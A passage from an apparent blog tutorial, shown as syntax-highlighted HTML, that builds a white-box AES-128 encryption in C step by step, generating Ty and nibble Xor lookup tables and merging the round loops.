</span><span class='line'>            <span class="n">mi</span><span class="p">.</span><span class="n">b</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">gmul</span><span class="p">[</span><span class="n">matrix</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]][</span><span class="n">j</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">Ty</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">mi</span><span class="p">.</span><span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%.8x&quot;</span><span class="p">,</span> <span class="n">Ty</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">((</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">  }&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;};</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Glad to replace that <code>MixColumn</code> call now:</p>

<figure class='code'><figcaption><span>aes128_enc_wb_step2</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_wb_step2</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">])</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can even make it cleaner by merging the two inner-loops &amp; make them both handle 4 bytes of data by 4 bytes of data:</p>

<figure class='code'><figcaption><span>aes128_enc_wb_step3</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">// Unified the loops by treating the state 4 bytes by 4 bytes</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_wb_step3</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">];</span>
</span><span class='line'>            <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">];</span>
</span><span class='line'>            <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span><span class='line'>            <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">])</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">]</span> <span class="o">^</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Last round which is a bit different</span>
</span><span class='line'>    <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="mi">9</span><span class="p">][</span><span class="n">j</span><span class="p">][</span><span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Step 6: Adding a little <em>xor</em> table</h2>

<p>This step is a really simple one (&amp; kind of useless) ; we just want to transform the <em>xor</em> operation between 2 double-words by a look-up table that does that between 2 nibbles (4 bits). Basically, you combine 8 nibbles to get a full double-word with <em>or</em> operations &amp; some binary shifts. Easy peasy:</p>

<figure class='code'><figcaption><span>wbaes128_unprotected_tables_generator.c:Xor table generation</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>    <span class="c1">/// Xor Tables</span>
</span><span class='line'>    <span class="c1">/// Basically takes two nibbles in input &amp; generate a nibble in output (x^y)</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">Xor</span><span class="p">[</span><span class="mh">0x10</span><span class="p">][</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;const unsigned char Xor[0x10][0x10] =</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;  {</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">j</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">j</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">    &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">Xor</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span> <span class="o">^</span> <span class="n">j</span><span class="p">;</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;0x%.1x&quot;</span><span class="p">,</span> <span class="n">Xor</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">if</span> <span class="p">((</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">  }&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span>
</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;,&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;};</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which is directly used by our implementation:</p>

<figure class='code'><figcaption><span>aes128_enc_wb_step4</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">aes128_enc_wb_step4</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">in</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Let&#39;s start the encryption process now</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">ShiftRows</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">a</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">];</span>
</span><span class='line'>            <span class="n">b</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">];</span>
</span><span class='line'>            <span class="n">c</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span><span class='line'>            <span class="n">d</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">Tboxes</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">aa</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">a</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">bb</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="n">b</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="n">c</span><span class="p">];</span>
</span><span class='line'>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">dd</span> <span class="o">=</span> <span class="n">Ty</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="n">d</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">out</span><span class="p">[</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span class="n">aa</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">bb</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]][</span><span class="n">Txor</span><span class="p">[(</span><span class="n">cc</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">][(</span><span class="n">dd</span> <span class="o">&gt;&gt;</span>  <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">]])</span>  <span class="o">|</span> <span class="p">((</span><span class="n">Txor</span><span class="p">[</span><span class="n">Txor</span><span class="p">[(</span><span 